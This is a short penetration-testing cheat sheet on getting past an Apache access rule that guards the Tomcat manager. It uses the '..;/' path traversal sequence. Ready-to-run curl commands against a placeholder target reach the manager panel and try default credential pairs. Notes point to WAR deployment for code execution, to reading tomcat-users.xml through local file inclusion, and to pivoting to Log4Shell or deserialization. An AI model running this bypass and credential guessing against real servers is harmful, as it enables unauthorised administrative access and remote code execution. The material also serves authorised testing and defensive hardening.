# Tomcat Manager Path Traversal Bypass

When Apache proxies Tomcat and blocks `/manager` via an Apache directive (only allow from localhost), the `..;/` path traversal sequence bypasses the Apache rule while Tomcat still serves the manager page.

## Bypass

```bash
# Apache rule blocks /manager → Tomcat hosts /manager
# Apache sees: /junk/..;/manager/ (doesn't match rule)
# Tomcat sees: /manager/ (processes normally)

curl -v "http://<TARGET>/junk/..;/manager/html"
# Returns 302 → /manager/html → Tomcat manager panel
```

## Access Manager Panel

```bash
# Try default credentials
curl -u "tomcat:tomcat" "http://<TARGET>/junk/..;/manager/html"
curl -u "admin:admin" "http://<TARGET>/junk/..;/manager/html"
curl -u "tomcat:s3cr3t" "http://<TARGET>/junk/..;/manager/html"
```

## Deploy WAR After Access (see Tomcat Manager WAR Deploy RCE)

```bash
# Note: WAR upload size may be restricted (max 1 byte = WAR deploy disabled)
# Alternative: check for Log4Shell or other RCE paths
```

## Notes
- Works when Apache uses `<Location /manager>` without trailing path normalization
- `..;/` is a Tomcat-specific path traversal (semicolon is treated as path separator)
- Reference: Orange Tsai's "Breaking Parser Logic" (Blackhat 2018)
- Check for exposed `tomcat-users.xml` via LFI: `/etc/tomcat9/tomcat-users.xml`
- If WAR upload is size-limited to 1 byte, pivot to Log4Shell or Tomcat session deserialization
